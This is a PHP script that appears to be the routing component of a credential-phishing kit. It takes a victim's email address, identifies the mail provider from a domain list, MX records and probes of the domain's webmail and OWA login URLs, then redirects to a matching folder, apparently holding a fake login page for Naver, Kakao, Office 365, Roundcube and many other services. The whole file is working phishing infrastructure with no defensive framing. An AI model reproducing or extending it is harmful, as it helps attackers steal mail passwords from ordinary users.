<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);

// === STEP 1: Validate and extract login/email ===
if (!isset($_GET['login']) || empty($_GET['login'])) {
    die('Missing login parameter.');
}

$login = $_GET['login'];

// Extract domain from email
function getDomainFromEmail($email) {
    $parts = explode('@', $email);
    return isset($parts[1]) ? strtolower(trim($parts[1])) : '';
}

$domain = getDomainFromEmail($login);
if (!$domain) {
    die('Invalid email address.');
}

// === STEP 2: Direct Match Routing ===
$directRoutes = [
    'naver.com'     => 'naver',
    'daum.net'      => 'kakao',
    'kakao.com'     => 'kakao',
    'hanmail.net'   => 'kakao',
    'nate.com'      => 'nate',
    'empas.com'     => 'nate',
    'empal.com'     => 'nate',
    'hanafos.com'   => 'nate',
    'lycos.com'     => 'nate',
    'netsgo.com'    => 'nate',
    '126.com'        => 'vip',
    '163.com'        => 'vip',
    'qq.com'        => 'qq',
    'foxmail.com'   => 'qq',
    'mail.ru'       => 'mailru',
    'inbox.ru'      => 'mailru',
    'list.ru'       => 'mailru',
    'bk.ru'         => 'mailru',
    'internet.ru'   => 'mailru',
    'lotte.net'     => 'lotte',
    'aol.com'       => 'aol',
    'freenet.de'    => 'freenet',
    'libero.it'     => 'libero'
];

foreach ($directRoutes as $key => $folder) {
    if (stripos($domain, $key) !== false) {
        header("Location: {$folder}/index.php?login=" . urlencode($login));
        exit;
    }
}

// === STEP 3: MX Record Based Routing ===
if (getmxrr($domain, $mxRecords)) {
    $mxRoutes = [
        'yandex'             => 'yandex',
        'worksmobile'        => 'worksmobile',
        '.mail.aliyun.com'   => 'mailaliyun',
        '.qiye.aliyun.com'   => 'qiyealiyun',
        '.enterprise.china.alibaba.com'        => 'qiyealiyun',
        '.outlook.com'       => 'office365',
        '.t-online.de'       => 't-online',
        '.mimecast.com'      => 'mimecast',
        '.orange.fr'         => 'orange',
        '.netease.com'       => 'netease',
        'mailplug.'          => 'mailplug',
        'chinaemail.cn'      => 'chinaemail',
        'secureserver.net'   => 'godaddy',
        'spam.cafe24.com'    => 'cafe24',
        '.fmcity.com'        => 'cafe24',
        'cgwebmail.'         => 'gw',
        '.daouoffice.com'    => 'daouoffice',
        'emx.mail.ru'        => 'bizmailru',
        'yahoodns.net'       => 'yahoobiz',
        'emailsrvr.com'      => 'emailsrvr',
        'mailhostbox.com'    => 'mailhostbox',
        'rzone.de'           => 'strato',
        '.gmx.net'           => 'gmx',
        'register.it'        => 'register',
        'chinanetsun.com'    => 'chinanetsun',
        'hiworks.co.kr'      => 'hiworks',
        'mxbiz1.qq.com'      => 'qqcom',
        'mxbiz2.qq.com'      => 'qqcom',
        '.cn4e.com'           => 'cn4e',
        'mailfilter.'        => 'hibox',
        'sfilter.'           => 'LG',
        '.mailwood.com'      => 'LG',
        'webmail.'           => 'roundcube',
        'bizmeka.com'        => 'bizmeka',
        'secuecloud.com'     => 'secuecloud',
        '.serverdata.net'    => 'owa',
        '.ecounterp.com'     => 'ecount',
        '.mailinblack.com'   => 'mailinblack',
        'whoisworks.com'     => 'whois'
    ];

    foreach ($mxRecords as $mx) {
        foreach ($mxRoutes as $needle => $route) {
            if (strpos($mx, $needle) !== false) {
                header("Location: {$route}/index.php?login=" . urlencode($login));
                exit;
            }
        }
    }
}

// === STEP 4: Probing Services (slow fallback check) ===
$sanitizedDomain = preg_replace('/[^a-zA-Z0-9.-]/', '', $domain);

$urls = [
    'groupware' => [
        "http://gw.$sanitizedDomain/groupware/login.php"
    ],
    'roundcube' => [
        "http://$sanitizedDomain/webmail/",
        "http://webmail.$sanitizedDomain/",
        "http://$sanitizedDomain:2095"
    ],
    'ngw' => [
        "http://mail.$sanitizedDomain/ngw/app/#/sign"
    ],
    'aruba' => [
        "https://webmail.aruba.it/"
    ],
    'gw' => [
        "https://gw.$sanitizedDomain/login"
    ],
    'owa' => [
        "https://$sanitizedDomain/owa/auth/logon.aspx?replaceCurrent=1&url=https://$sanitizedDomain/owa",
        "https://mail.$sanitizedDomain/owa/auth/logon.aspx?replaceCurrent=1&url=https://$sanitizedDomain/owa"
    ]
];

function url_alive($url) {
    $headers = @get_headers($url);
    if ($headers && isset($headers[0])) {
        return strpos($headers[0], '200') !== false || strpos($headers[0], '302') !== false;
    }
    return false;
}

foreach ($urls['groupware'] as $url) {
    if (url_alive($url)) {
        header("Location: groupware/index.php?login=" . urlencode($login));
        exit;
    }
}

foreach ($urls['roundcube'] as $url) {
    if (url_alive($url)) {
        header("Location: roundcube/index.php?login=" . urlencode($login));
        exit;
    }
}

foreach ($urls['ngw'] as $url) {
    if (url_alive($url)) {
        header("Location: ngw/index.php?login=" . urlencode($login));
        exit;
    }
}

foreach ($urls['aruba'] as $url) {
    if (url_alive($url)) {
        header("Location: aruba/index.php?login=" . urlencode($login));
        exit;
    }
}

foreach ($urls['gw'] as $url) {
    if (url_alive($url)) {
        header("Location: gw/index.php?login=" . urlencode($login));
        exit;
    }
}

foreach ($urls['owa'] as $url) {
    if (url_alive($url)) {
        header("Location: owa/index.php?login=" . urlencode($login));
        exit;
    }
}

// === STEP 5: Whois keyword fallback ===
if (strpos(@file_get_contents("http://$sanitizedDomain"), 'Whois') !== false) {
    header("Location: whois/index.php?login=" . urlencode($login));
    exit;
}

// === STEP 6: Final fallback ===
header("Location: other/index.php?login=" . urlencode($login));
exit;
?>
